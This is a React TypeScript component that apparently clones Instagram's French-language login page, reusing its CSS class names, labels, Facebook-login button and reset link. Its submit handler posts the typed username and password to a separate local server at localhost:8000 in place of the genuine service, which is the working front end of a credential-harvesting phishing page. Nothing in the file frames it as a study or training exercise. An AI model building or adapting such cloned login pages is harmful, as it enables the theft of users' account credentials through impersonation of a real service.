import React from 'react'

type State = {
  username?: string
  password?: string
}

class Form extends React.Component<{}, State> {

  constructor (props: any) {
    super(props)
    this.state = {
      username: '',
      password: ''
    }
  }

  handleChange = (e: React.SyntheticEvent) => {
    this.setState({
      [e.target.name]: e.target.value
    })
  }

  handleSubmit = (e: React.SyntheticEvent) => {
    e.preventDefault()
    window.fetch('http://localhost:8000/', {
      method: 'post',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: this.prepareRequestData()
    });
  }

  prepareRequestData = () => {
    return Object
      .keys(this.state)
      .map(l => encodeURIComponent(l) + '=' + encodeURIComponent(this.state[l]))
      .join('&')
  }

  render () {
    return (
      <form className="HmktE" id="loginForm" method="post" onSubmit={this.handleSubmit}>
          <div className="                     Igw0E     IwRSH      eGOV_         _4EzTm                                                              kEKum                                                "><div className="-MzZI">
            <div className="_9GP1n   ">
              <label className={`f0n8F ${(this.state?.username?.length ?? 0) > 0 && 'FATdn'}`}>
                <span className="_9nyy2">Num. téléphone, nom d’utilisateur ou e-mail</span>
                <input aria-label="Num. téléphone, nom d’utilisateur ou e-mail" aria-required="true" maxLength={75} name="username" type="text" className="_2hvTZ pexuQ zyHYP" value={this.state.username} onChange={this.handleChange} />
              </label>
              <div className="i24fI"></div>
            </div>
          </div>
          <div className="-MzZI">
            <div className="_9GP1n   ">
              <label className={`f0n8F ${(this.state?.password?.length ?? 0) > 0 && 'FATdn'}`}>
                <span className="_9nyy2">Mot de passe</span>
                <input aria-label="Mot de passe" aria-required="true" name="password" type="password" className="_2hvTZ pexuQ zyHYP" value={this.state.password} onChange={this.handleChange} />
              </label>
              <div className="i24fI"></div>
            </div>
          </div>
          <div className="                     Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    ">
            <button disabled={!((this.state.username?.length ?? 0) > 0 && (this.state.password?.length ?? 0) > 5)} className="sqdOP  L3NKy   y3zKF     " type="submit">
              <div className="                     Igw0E     IwRSH      eGOV_         _4EzTm                                                                                                              ">Connexion</div>
            </button>
          </div>
          <div className="K-1uj Z7p_S">
            <div className="s311c"></div>
            <div className="_0tv-g">ou</div>
            <div className="s311c"></div>
          </div>
          <div className="                     Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    ">
            <button className="sqdOP yWX7d    y3zKF     " type="button">
              <span className=" coreSpriteFacebookIcon AeB99"></span>
              <span className="KPnG0">Se connecter avec Facebook</span>
            </button>
          </div>
        </div>
        <a className="_2Lks6" href="/accounts/password/reset/" tabIndex={0}>Mot de passe oublié&nbsp;?</a>
      </form>
    )
  }

}

export default Form